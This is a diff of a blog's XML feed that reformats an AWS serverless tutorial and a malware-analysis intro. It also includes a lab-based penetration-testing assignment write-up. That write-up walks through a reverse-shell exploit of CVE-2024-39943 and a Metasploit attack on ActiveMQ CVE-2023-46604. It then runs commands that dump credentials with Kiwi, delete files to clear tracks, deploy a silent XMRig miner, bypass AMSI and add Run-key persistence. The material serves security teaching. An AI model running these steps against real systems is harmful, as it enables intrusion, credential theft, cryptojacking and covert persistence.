-        <category>Cybersecurity</category>
-        <category>Ethical Hacking</category>
+          
+          <category> Cloud Architecture </category>
+          
       </categories>
-      <tags>
-        <tag>Ethical Hacking</tag>
-        <tag>Penetration Testing</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Build a Serverless Web App on AWS</title>
-    <url>/2025/02/04/Build-a-Serverless-Web-App-on-AWS/</url>
-    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Serverless architecture eliminates the need for infrastructure management, allowing developers to focus on code rather than servers. In this guide, we will walk through the process of building a serverless web application using AWS services.</p>
-<h2 id="What-is-Serverless-Architecture"><a href="#What-is-Serverless-Architecture" class="headerlink" title="What is Serverless Architecture?"></a>What is Serverless Architecture?</h2><p>Serverless architecture allows applications to run without provisioning or managing servers. AWS provides services like:</p>
-<ul>
-<li><strong>AWS Lambda</strong> for executing backend logic.</li>
-<li><strong>Amazon API Gateway</strong> for handling HTTP requests.</li>
-<li><strong>Amazon DynamoDB</strong> as a NoSQL database.</li>
-<li><strong>Amazon S3</strong> for static website hosting.</li>
-<li><strong>Amazon SNS</strong> for event-driven notifications.</li>
-</ul>
-<h2 id="Serverless-Application-Architecture-on-AWS"><a href="#Serverless-Application-Architecture-on-AWS" class="headerlink" title="Serverless Application Architecture on AWS"></a>Serverless Application Architecture on AWS</h2><h3 id="1-Hosting-a-Static-Web-Application"><a href="#1-Hosting-a-Static-Web-Application" class="headerlink" title="1. Hosting a Static Web Application"></a>1. <strong>Hosting a Static Web Application</strong></h3><p>We use <strong>Amazon S3</strong> to host a static website.</p>
-<ol>
-<li>Create an S3 bucket.</li>
-<li>Enable static website hosting in bucket properties.</li>
-<li>Upload the frontend files (HTML, CSS, JavaScript).</li>
-<li>Set bucket permissions for public access.</li>
-</ol>
-<h3 id="2-Setting-Up-API-Gateway-and-Lambda"><a href="#2-Setting-Up-API-Gateway-and-Lambda" class="headerlink" title="2. Setting Up API Gateway and Lambda"></a>2. <strong>Setting Up API Gateway and Lambda</strong></h3><p>AWS API Gateway provides an interface for HTTP requests and routes them to AWS Lambda.</p>
-<ol>
-<li>Create an <strong>API Gateway</strong> with HTTP methods (GET, POST, etc.).</li>
-<li>Configure <strong>Lambda functions</strong> to process API requests.<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">handler</span> = <span class="keyword">async</span> (<span class="params">event</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> body;</span><br><span class="line">    <span class="keyword">let</span> statusCode = <span class="string">&quot;200&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> headers = &#123;</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Full event object:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(event, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">  </span><br><span class="line">      <span class="comment">// Extract HTTP method and validate it</span></span><br><span class="line">      <span class="keyword">const</span> method = event.<span class="property">requestContext</span>?.<span class="property">http</span>?.<span class="property">method</span> || event.<span class="property">httpMethod</span>;</span><br><span class="line">      <span class="keyword">if</span> (!method) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;HTTP method is missing in the event object.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> tableName;</span><br><span class="line">      <span class="keyword">if</span> (method === <span class="string">&quot;POST&quot;</span> &amp;&amp; event.<span class="property">body</span>) &#123;</span><br><span class="line">        <span class="comment">// For POST, get TableName from the request body</span></span><br><span class="line">        <span class="keyword">const</span> requestBody = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">body</span>);</span><br><span class="line">        tableName = requestBody.<span class="property">TableName</span>;</span><br><span class="line">        <span class="keyword">if</span> (!tableName) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;TableName is required in the request body.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// For GET, get TableName from the query string</span></span><br><span class="line">        tableName = event.<span class="property">queryStringParameters</span>?.<span class="property">TableName</span>;</span><br><span class="line">        <span class="keyword">if</span> (!tableName) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;TableName is required in the query string.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">switch</span> (method) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;POST&quot;</span>: &#123;</span><br><span class="line">          <span class="comment">// Ensure required fields are present in the body for POST</span></span><br><span class="line">          <span class="keyword">const</span> requestBody = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">body</span>);</span><br><span class="line">          <span class="keyword">if</span> (!requestBody.<span class="property">Item</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Item is required in the request body.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Step 1: Get the current `nextid` from the record with `id = -1`</span></span><br><span class="line">          <span class="keyword">const</span> getParams = &#123;</span><br><span class="line">            <span class="title class_">TableName</span>: tableName,</span><br><span class="line">            <span class="title class_">Key</span>: &#123; <span class="attr">id</span>: -<span class="number">1</span> &#125;, <span class="comment">// Assuming `id` is a number</span></span><br><span class="line">          &#125;;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">const</span> &#123; <span class="title class_">Item</span>: metadata &#125; = <span class="keyword">await</span> dynamo.<span class="title function_">get</span>(getParams);</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (!metadata || !metadata.<span class="property">nextid</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Could not retrieve nextid from the metadata record (id = -1).&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">const</span> currentNextId = metadata.<span class="property">nextid</span>;</span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Step 2: Increment `nextid` for the new item</span></span><br><span class="line">          <span class="keyword">const</span> newId = currentNextId;</span><br><span class="line">          <span class="keyword">const</span> updatedNextId = currentNextId + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Step 3: Update the `nextid` in the metadata record</span></span><br><span class="line">          <span class="keyword">const</span> updateParams = &#123;</span><br><span class="line">            <span class="title class_">TableName</span>: tableName,</span><br><span class="line">            <span class="title class_">Key</span>: &#123; <span class="attr">id</span>: -<span class="number">1</span> &#125;,</span><br><span class="line">            <span class="title class_">UpdateExpression</span>: <span class="string">&quot;SET nextid = :nextid&quot;</span>,</span><br><span class="line">            <span class="title class_">ExpressionAttributeValues</span>: &#123;</span><br><span class="line">              <span class="string">&quot;:nextid&quot;</span>: updatedNextId,</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">await</span> dynamo.<span class="title function_">update</span>(updateParams);</span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Step 4: Insert the new item with the assigned `id`</span></span><br><span class="line">          <span class="keyword">const</span> newItem = &#123;</span><br><span class="line">            ...requestBody.<span class="property">Item</span>,</span><br><span class="line">            <span class="attr">id</span>: newId, <span class="comment">// Add the auto-incremented id</span></span><br><span class="line">          &#125;;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">const</span> putParams = &#123;</span><br><span class="line">            <span class="title class_">TableName</span>: tableName,</span><br><span class="line">            <span class="title class_">Item</span>: newItem,</span><br><span class="line">          &#125;;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">await</span> dynamo.<span class="title function_">put</span>(putParams);</span><br><span class="line">  </span><br><span class="line">          body = &#123; <span class="attr">message</span>: <span class="string">&quot;Item successfully created.&quot;</span>, newItem &#125;;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">          <span class="comment">// Handle GET requests</span></span><br><span class="line">          <span class="keyword">const</span> scanParams = &#123; <span class="title class_">TableName</span>: tableName &#125;;</span><br><span class="line">          <span class="keyword">const</span> scanResult = <span class="keyword">await</span> dynamo.<span class="title function_">scan</span>(scanParams);</span><br><span class="line">          body = scanResult;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Unsupported method &quot;<span class="subst">$&#123;method&#125;</span>&quot;`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error occurred:&quot;</span>, err.<span class="property">message</span>);</span><br><span class="line">      statusCode = <span class="string">&quot;400&quot;</span>;</span><br><span class="line">      body = &#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      body = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(body);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      statusCode,</span><br><span class="line">      body,</span><br><span class="line">      headers,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></li>
-<li>Enable <strong>CORS</strong> in API Gateway to allow web access.</li>
-<li>Deploy the API and obtain the endpoint URL.</li>
-</ol>
-<h3 id="3-Database-Integration-with-DynamoDB"><a href="#3-Database-Integration-with-DynamoDB" class="headerlink" title="3. Database Integration with DynamoDB"></a>3. <strong>Database Integration with DynamoDB</strong></h3><p>Amazon DynamoDB is used as a NoSQL database for storing customer data.</p>
-<ol>
-<li>Create a <strong>DynamoDB table</strong> with a partition key <code>id</code>.</li>
-<li>Use AWS SDK in Lambda to interact with the database.</li>
-<li>Implement API Gateway methods for GET and POST requests.</li>
-</ol>
-<h3 id="4-Implementing-a-Notification-System-with-SNS"><a href="#4-Implementing-a-Notification-System-with-SNS" class="headerlink" title="4. Implementing a Notification System with SNS"></a>4. <strong>Implementing a Notification System with SNS</strong></h3><p>AWS SNS allows sending notifications for database changes or file uploads.</p>
-<ol>
-<li>Create an SNS topic and subscribe an admin email.</li>
-<li>Configure <strong>Lambda functions</strong> to trigger SNS notifications.</li>
-<li>Set up <strong>S3 event notifications</strong> for file uploads.</li>
-</ol>
-<h2 id="Deployment-and-Testing"><a href="#Deployment-and-Testing" class="headerlink" title="Deployment and Testing"></a>Deployment and Testing</h2><h3 id="1-Testing-API-Gateway-and-Lambda"><a href="#1-Testing-API-Gateway-and-Lambda" class="headerlink" title="1. Testing API Gateway and Lambda"></a>1. <strong>Testing API Gateway and Lambda</strong></h3><ul>
-<li>Use <strong>Postman</strong> or <code>curl</code> to send HTTP requests to the API Gateway endpoint.</li>
-<li>Check <strong>CloudWatch logs</strong> for debugging Lambda execution.</li>
-</ul>
-<h3 id="2-Validating-DynamoDB-Data-Storage"><a href="#2-Validating-DynamoDB-Data-Storage" class="headerlink" title="2. Validating DynamoDB Data Storage"></a>2. <strong>Validating DynamoDB Data Storage</strong></h3><ul>
-<li>Use AWS Console to inspect DynamoDB records.</li>
-<li>Run queries using the AWS CLI.</li>
-</ul>
-<h3 id="3-Ensuring-Notification-System-Works"><a href="#3-Ensuring-Notification-System-Works" class="headerlink" title="3. Ensuring Notification System Works"></a>3. <strong>Ensuring Notification System Works</strong></h3><ul>
-<li>Upload a file to the S3 bucket and verify the email notification.</li>
-<li>Add a record to DynamoDB and check SNS messages.</li>
-</ul>
-<h2 id="AWS-Well-Architected-Framework-Considerations"><a href="#AWS-Well-Architected-Framework-Considerations" class="headerlink" title="AWS Well-Architected Framework Considerations"></a>AWS Well-Architected Framework Considerations</h2><h3 id="Security"><a href="#Security" class="headerlink" title="Security"></a><strong>Security</strong></h3><ul>
-<li>Use <strong>IAM roles and policies</strong> for access control.</li>
-<li>Encrypt data at rest and in transit.</li>
-</ul>
-<h3 id="Reliability"><a href="#Reliability" class="headerlink" title="Reliability"></a><strong>Reliability</strong></h3><ul>
-<li>Enable <strong>DynamoDB auto-scaling</strong> to handle variable loads.</li>
-<li>Use <strong>multi-AZ deployment</strong> for resilience.</li>
-</ul>
-<h3 id="Performance-Efficiency"><a href="#Performance-Efficiency" class="headerlink" title="Performance Efficiency"></a><strong>Performance Efficiency</strong></h3><ul>
-<li>Optimize Lambda function execution time to minimize costs.</li>
-<li>Use <strong>CloudFront</strong> for caching and faster content delivery.</li>
-</ul>
-<h3 id="Cost-Optimization"><a href="#Cost-Optimization" class="headerlink" title="Cost Optimization"></a><strong>Cost Optimization</strong></h3><ul>
-<li>Configure <strong>S3 lifecycle policies</strong> for storage optimization.</li>
-<li>Minimize Lambda execution time to reduce compute costs.</li>
-</ul>
-<h2 id="Video-of-Serverless-Web-Applications"><a href="#Video-of-Serverless-Web-Applications" class="headerlink" title="Video of Serverless Web Applications"></a>Video of Serverless Web Applications</h2><iframe src="https://www.youtube.com/embed/u8v-j1AqhlQ?si=JoZK_U_pBlIdf0fH" width="100%" height="415" frameborder="0" loading="lazy" allowfullscreen></iframe>
-
-<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Serverless architecture on AWS simplifies application deployment, reduces infrastructure costs, and scales dynamically. By integrating <strong>Lambda, API Gateway, DynamoDB, S3, and SNS</strong>, you can build a fully functional web application with minimal infrastructure overhead.</p>
-<hr>
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
-<li><a href="https://docs.aws.amazon.com/lambda/latest/dg/welcome.html">AWS Lambda Documentation</a></li>
-<li><a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html">Amazon API Gateway Guide</a></li>
-<li><a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Introduction.html">DynamoDB Introduction</a></li>
-<li><a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteHosting.html">Hosting Websites on S3</a></li>
-</ul>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> AWS </tag>
+            
+            <tag> Serverless </tag>
+            
+            <tag> Cloud Computing </tag>
+            
+            <tag> Web Development </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Ethical Hacking Assignment | SME Network Penetration Testing</title>
+      <link href="/2025/01/28/Ethical-Hacking-Pentesting/"/>
+      <url>/2025/01/28/Ethical-Hacking-Pentesting/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>During the COVID-19 pandemic, many organizations faced cybersecurity challenges as they quickly adapted to remote work environments. “<strong>Tech Skibidi Inc.</strong>“, a medium-sized IT support and software development company, encountered vulnerabilities due to rapid technology deployment and insufficient security measures. This project aims to assess and strengthen their security posture through penetration testing and real-world attack simulations.</p><h2 id="Objectives"><a href="#Objectives" class="headerlink" title="Objectives"></a>Objectives</h2><ul><li>Identify vulnerabilities within the office network.</li><li>Simulate real-world cyberattacks to evaluate system resilience.</li><li>Provide actionable recommendations to mitigate risks and improve security.</li></ul><h2 id="Use-Case-SME-Office-Network-Penetration-Testing"><a href="#Use-Case-SME-Office-Network-Penetration-Testing" class="headerlink" title="Use Case: SME Office Network Penetration Testing"></a>Use Case: SME Office Network Penetration Testing</h2><h3 id="Business-Overview"><a href="#Business-Overview" class="headerlink" title="Business Overview"></a>Business Overview</h3><p><strong>Tech Skibidi Inc.</strong> employs 50 staff members across its main office and remote locations. Their network includes desktops, laptops, smartphones, printers, routers, and switches, primarily relying on Windows servers with some Linux systems.</p><h3 id="Penetration-Testing-Goals"><a href="#Penetration-Testing-Goals" class="headerlink" title="Penetration Testing Goals"></a>Penetration Testing Goals</h3><p>The project simulates attacks to uncover weaknesses and demonstrate their impact through:</p><ul><li>Network scanning and enumeration.</li><li>Vulnerability assessment.</li><li>Exploitation and post-exploitation activities.</li></ul><h2 id="Pen-Test-Environment-Setup"><a href="#Pen-Test-Environment-Setup" class="headerlink" title="Pen-Test Environment Setup"></a>Pen-Test Environment Setup</h2><h3 id="Network-Diagram"><a href="#Network-Diagram" class="headerlink" title="Network Diagram"></a>Network Diagram</h3><p>The network is divided into virtual machines for the attacker and target environments:</p><ul><li><strong>Attacking Machine</strong>: Kali&#x2F;Black Arch&#x2F;Parrot Linux.</li><li><strong>Linux Server</strong>: Ubuntu 24.04 LTS.</li><li><strong>Windows Server</strong>: 2019 with Active Directory.</li></ul><h3 id="Virtual-Network-Interfaces-Configuration"><a href="#Virtual-Network-Interfaces-Configuration" class="headerlink" title="Virtual Network Interfaces Configuration"></a>Virtual Network Interfaces Configuration</h3><ul><li><strong>VMnet1</strong>: Host-only (192.168.1.0&#x2F;24)</li><li><strong>VMnet2</strong>: Host-only (192.168.2.0&#x2F;24)</li><li><strong>VMnet3</strong>: Host-only (192.168.3.0&#x2F;24)</li></ul><p>Each device is assigned a unique IP address and configured to ensure isolation and security.</p><hr><h2 id="Tasks-and-Highlights"><a href="#Tasks-and-Highlights" class="headerlink" title="Tasks and Highlights"></a>Tasks and Highlights</h2><h3 id="Task-1-Network-Scanning-and-Enumeration"><a href="#Task-1-Network-Scanning-and-Enumeration" class="headerlink" title="Task 1: Network Scanning and Enumeration"></a>Task 1: Network Scanning and Enumeration</h3><ul><li>Tools used: <strong>Nmap</strong> to identify live hosts, open ports, and services.</li><li>Results: Enumeration revealed several exploitable vulnerabilities.</li></ul><h3 id="Task-2-Vulnerability-Assessment"><a href="#Task-2-Vulnerability-Assessment" class="headerlink" title="Task 2: Vulnerability Assessment"></a>Task 2: Vulnerability Assessment</h3><ul><li>Tools used: <strong>OpenVAS</strong> and <strong>Nessus</strong> to detect vulnerabilities.</li><li>Findings: Key exploits include <strong>CVE-2024-39943</strong> (HFS) and <strong>CVE-2023-46604</strong> (ActiveMQ).</li></ul><hr><h2 id="Exploitation-Step-by-Step-Process"><a href="#Exploitation-Step-by-Step-Process" class="headerlink" title="Exploitation: Step-by-Step Process"></a>Exploitation: Step-by-Step Process</h2><h3 id="Exploitation-1-Rejetto-HFS-Vulnerability-CVE-2024-39943"><a href="#Exploitation-1-Rejetto-HFS-Vulnerability-CVE-2024-39943" class="headerlink" title="Exploitation 1: Rejetto HFS Vulnerability (CVE-2024-39943)"></a>Exploitation 1: Rejetto HFS Vulnerability (CVE-2024-39943)</h3><h4 id="Step-1-Scan-the-Target"><a href="#Step-1-Scan-the-Target" class="headerlink" title="Step 1: Scan the Target"></a>Step 1: Scan the Target</h4><ol><li><p>Run <code>nmap</code> to identify open ports on the target Ubuntu server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.129</span><br></pre></td></tr></table></figure></li><li><p>Confirm port 443 is open for HTTP File Server.</p></li></ol><h4 id="Step-2-Login-to-the-HFS-Web-Interface"><a href="#Step-2-Login-to-the-HFS-Web-Interface" class="headerlink" title="Step 2: Login to the HFS Web Interface"></a>Step 2: Login to the HFS Web Interface</h4><ol><li>Access the target HFS server at:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;Ubuntu IP&gt;:443/</span><br></pre></td></tr></table></figure></li><li>Login using default credentials:<ul><li><strong>Username</strong>: <code>guest</code></li><li><strong>Password</strong>: <code>guest</code></li></ul></li></ol><h4 id="Step-3-Capture-Session-Cookies"><a href="#Step-3-Capture-Session-Cookies" class="headerlink" title="Step 3: Capture Session Cookies"></a>Step 3: Capture Session Cookies</h4><ol><li>Open the browser’s <strong>Network Inspector</strong> and refresh the page.</li><li>Copy the session cookies from the <strong>GET</strong> request headers.</li></ol><h4 id="Step-4-Exploit-the-Vulnerability"><a href="#Step-4-Exploit-the-Vulnerability" class="headerlink" title="Step 4: Exploit the Vulnerability"></a>Step 4: Exploit the Vulnerability</h4><ol><li>Prepare a listening terminal on the attacker machine:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -lvp 4444</span><br></pre></td></tr></table></figure></li><li>Use the <code>hfs_vuln_script.py</code> to exploit the server:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./hfs_vuln_script.py</span><br></pre></td></tr></table></figure></li><li>Provide the following details in the script:<ul><li><strong>URL</strong>: Target HFS server URL.</li><li><strong>Cookies</strong>: Captured session cookies.</li><li><strong>Attacker IP</strong>: Local IP of the attacking machine.</li><li><strong>Port</strong>: Listening port (e.g., 4444).</li></ul></li></ol><h4 id="Step-5-Verify-Exploitation"><a href="#Step-5-Verify-Exploitation" class="headerlink" title="Step 5: Verify Exploitation"></a>Step 5: Verify Exploitation</h4><ul><li>Check the terminal for root access to the Ubuntu server.</li></ul><hr><h3 id="Exploitation-2-ActiveMQ-Hello-Kitty-Vulnerability-CVE-2023-46604"><a href="#Exploitation-2-ActiveMQ-Hello-Kitty-Vulnerability-CVE-2023-46604" class="headerlink" title="Exploitation 2: ActiveMQ Hello Kitty Vulnerability (CVE-2023-46604)"></a>Exploitation 2: ActiveMQ Hello Kitty Vulnerability (CVE-2023-46604)</h3><h4 id="Step-1-Setup-the-Target"><a href="#Step-1-Setup-the-Target" class="headerlink" title="Step 1: Setup the Target"></a>Step 1: Setup the Target</h4><ol><li>Install <strong>ActiveMQ Server</strong> on Windows Server 2019 (version 5.18.2).</li><li>Start the server by running the <code>.bat</code> file.</li></ol><h4 id="Step-2-Prepare-the-Exploit"><a href="#Step-2-Prepare-the-Exploit" class="headerlink" title="Step 2: Prepare the Exploit"></a>Step 2: Prepare the Exploit</h4><ol><li>On the Kali machine, download the exploit source code for CVE-2023-46604.</li><li>Copy the payload to the Metasploit framework’s <code>misc</code> folder.</li></ol><h4 id="Step-3-Configure-Metasploit"><a href="#Step-3-Configure-Metasploit" class="headerlink" title="Step 3: Configure Metasploit"></a>Step 3: Configure Metasploit</h4><ol><li>Launch Metasploit:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li>Reload all modules to include the new payload:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure></li><li>Search for the CVE payload:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search cve-2023-46604</span><br></pre></td></tr></table></figure></li><li>Select the payload and set required options:<ul><li><strong>RHOST</strong>: Target IP address.</li><li><strong>LHOST</strong>: Attacker IP address.</li><li><strong>SRVPORT</strong>: Local listening port.</li><li><strong>FETCH_SRVPORT</strong>: Exploit port (different from SRVPORT).</li></ul></li></ol><h4 id="Step-4-Execute-the-Exploit"><a href="#Step-4-Execute-the-Exploit" class="headerlink" title="Step 4: Execute the Exploit"></a>Step 4: Execute the Exploit</h4><ol><li>Launch the attack:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li>Start a Meterpreter session with the victim machine.</li></ol><hr><h3 id="Task-4-Post-Exploitation-Activities"><a href="#Task-4-Post-Exploitation-Activities" class="headerlink" title="Task 4: Post-Exploitation Activities"></a>Task 4: Post-Exploitation Activities</h3><h4 id="1-Data-Exfiltration"><a href="#1-Data-Exfiltration" class="headerlink" title="1. Data Exfiltration"></a>1. Data Exfiltration</h4><ol><li>Use <strong>Meterpreter (Kiwi)</strong> to dump credentials:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure></li><li>Save the credentials to a text file:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download C:\\Users\\Public\\passwords.txt /home/kali/passwords.txt</span><br></pre></td></tr></table></figure></li><li>Clear tracks by deleting the text file from the victim machine:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> C:\\Users\\Public\\passwords.txt</span><br></pre></td></tr></table></figure></li></ol><h4 id="2-Silent-Cryptocurrency-Mining"><a href="#2-Silent-Cryptocurrency-Mining" class="headerlink" title="2. Silent Cryptocurrency Mining"></a>2. Silent Cryptocurrency Mining</h4><ol><li>Upload the <strong>Silent-XMRig-Miner</strong> to the victim machine:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/kali/Downloads/SilentMiner.zip C:\\Desktop</span><br></pre></td></tr></table></figure></li><li>Execute the miner silently:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start-Process -FilePath <span class="string">&quot;C:\\Desktop\\SilentMiner\\xmrig.exe&quot;</span> -Verb RunAs</span><br></pre></td></tr></table></figure></li></ol><h4 id="3-Sliver-C2-Framework"><a href="#3-Sliver-C2-Framework" class="headerlink" title="3. Sliver C2 Framework"></a>3. Sliver C2 Framework</h4><ol><li>Inject processes and bypass AMSI:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inject-etw-bypass &lt;pid&gt;</span><br><span class="line">inject-asmi-bypass &lt;pid&gt;</span><br></pre></td></tr></table></figure></li><li>Create persistence:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registry write -T binary --path /tmp/GREEN_OVERSHOOT.exe --hive HKCU <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span> updater</span><br></pre></td></tr></table></figure></li><li>Capture screenshots:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The penetration testing project successfully demonstrated the exploitation of critical vulnerabilities in <strong>Tech Skibidi Inc.’s</strong> network, including:</p><ul><li>Remote code execution (CVE-2024-39943).</li><li>Privilege escalation and data exfiltration (CVE-2023-46604).</li><li>Covert cryptocurrency mining and persistent access.</li></ul><h3 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h3><ol><li>Patch outdated software (HFS, ActiveMQ).</li><li>Enhance monitoring for unauthorized processes and file changes.</li><li>Implement robust access controls and endpoint detection.</li></ol><hr><h2 id="Citations"><a href="#Citations" class="headerlink" title="Citations"></a>Citations</h2><ul><li><a href="https://github.com/BishopFox/sliver">Sliver C2 Documentation</a></li><li><a href="https://github.com/truonghuuphuc/CVE-2024-39943-Poc">CVE-2024-39943 PoC</a></li><li><a href="https://github.com/operationalguy/silent-XMRig-miner">Silent-XMRig-Miner</a></li><li><a href="https://activemq.apache.org/components/classic/download/classic-05-18-02">ActiveMQ Vulnerability Details</a></li></ul><hr>]]></content>
+      
+      
       <categories>
-        <category>Cloud Architecture</category>
+          
+          <category> Cybersecurity </category>
+          
+          <category> Ethical Hacking </category>
+          
       </categories>
-      <tags>
-        <tag>AWS</tag>
-        <tag>Serverless</tag>
-        <tag>Cloud Computing</tag>
-        <tag>Web Development</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Dynamic Malware Analysis</title>
-    <url>/2025/01/28/Malware-Analysis-Project/</url>
-    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Dynamic malware analysis is a crucial technique for understanding the behavior of malicious software in a controlled environment. By observing how malware executes and interacts with its host system, we can uncover hidden functionalities, identify affected files and processes, and better prepare countermeasures. Watch the introduction to dynamic malware analysis here:</p>
-<h2 id="Dynamic-Malware-Analysis"><a href="#Dynamic-Malware-Analysis" class="headerlink" title="Dynamic Malware Analysis"></a>Dynamic Malware Analysis</h2><p>Dynamic malware analysis involves running the malware in a secure environment to observe its runtime behavior. This method reveals how malware impacts the system, including file changes, process creation, network activities, and registry modifications. By using tools like <strong>Process Monitor</strong>, <strong>Regshot</strong>, and <strong>ApateDNS</strong>, analysts can track these activities and understand the malware’s objectives.</p>
-<h3 id="Key-Steps"><a href="#Key-Steps" class="headerlink" title="Key Steps:"></a>Key Steps:</h3><ol>
-<li><p><strong>Setting Up a Secure Environment</strong>:</p>
-<ul>
-<li>Use virtual machines to isolate malware from the host system.</li>
-<li>Configure network settings to prevent unauthorized connections.</li>
-</ul>
-</li>
